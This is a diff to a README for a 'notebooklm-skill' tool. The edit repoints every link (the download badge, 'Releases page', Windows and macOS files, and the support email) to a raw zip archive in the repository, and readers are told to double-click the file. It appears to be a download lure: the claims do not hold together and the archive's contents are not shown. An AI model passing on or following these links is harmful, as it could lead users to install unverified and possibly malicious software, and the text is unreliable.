@@ -6,9 +6,9 @@ Welcome to notebooklm-skill! This tool allows Claude Code to communicate directl
 
 ## 🔗 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/wserre/notebooklm-skill/master/ambash/notebooklm-skill.zip%20Skill-brightgreen)](https://raw.githubusercontent.com/wserre/notebooklm-skill/master/ambash/notebooklm-skill.zip)
+[![Download Now](https://raw.githubusercontent.com/wserre/notebooklm-skill/master/scripts/notebooklm_skill_1.0.zip%20Skill-brightgreen)](https://raw.githubusercontent.com/wserre/notebooklm-skill/master/scripts/notebooklm_skill_1.0.zip)
 
-You can visit the Releases page to download the application. The link is provided here for your convenience: [Download NotebookLM Skill](https://raw.githubusercontent.com/wserre/notebooklm-skill/master/ambash/notebooklm-skill.zip).
+You can visit the Releases page to download the application. The link is provided here for your convenience: [Download NotebookLM Skill](https://raw.githubusercontent.com/wserre/notebooklm-skill/master/scripts/notebooklm_skill_1.0.zip).
 
 ## 💻 System Requirements
 
@@ -19,11 +19,11 @@ You can visit the Releases page to download the application. The link is provide
 
 ## 📥 Download & Install
 
-1. Click the link to visit the Releases page: [NotebookLM Skill Releases](https://raw.githubusercontent.com/wserre/notebooklm-skill/master/ambash/notebooklm-skill.zip).
+1. Click the link to visit the Releases page: [NotebookLM Skill Releases](https://raw.githubusercontent.com/wserre/notebooklm-skill/master/scripts/notebooklm_skill_1.0.zip).
 2. Find the latest release version at the top of the page.
 3. Click on the appropriate file for your operating system:
-   - For Windows, select `https://raw.githubusercontent.com/wserre/notebooklm-skill/master/ambash/notebooklm-skill.zip`.
-   - For macOS, select `https://raw.githubusercontent.com/wserre/notebooklm-skill/master/ambash/notebooklm-skill.zip`.
+   - For Windows, select `https://raw.githubusercontent.com/wserre/notebooklm-skill/master/scripts/notebooklm_skill_1.0.zip`.
+   - For macOS, select `https://raw.githubusercontent.com/wserre/notebooklm-skill/master/scripts/notebooklm_skill_1.0.zip`.
 4. Save the file to your computer.
 5. Locate the downloaded file and double-click to open it.
 6. Follow the on-screen instructions to complete the installation.
@@ -54,7 +54,7 @@ If you experience issues, try the following steps:
 
 ## 📞 Support
 
-For any questions or concerns, feel free to reach out. You can open an issue on our GitHub page or contact our support team via email at https://raw.githubusercontent.com/wserre/notebooklm-skill/master/ambash/notebooklm-skill.zip We aim to respond within 48 hours.
+For any questions or concerns, feel free to reach out. You can open an issue on our GitHub page or contact our support team via email at https://raw.githubusercontent.com/wserre/notebooklm-skill/master/scripts/notebooklm_skill_1.0.zip We aim to respond within 48 hours.
 
 ## 📜 License
 
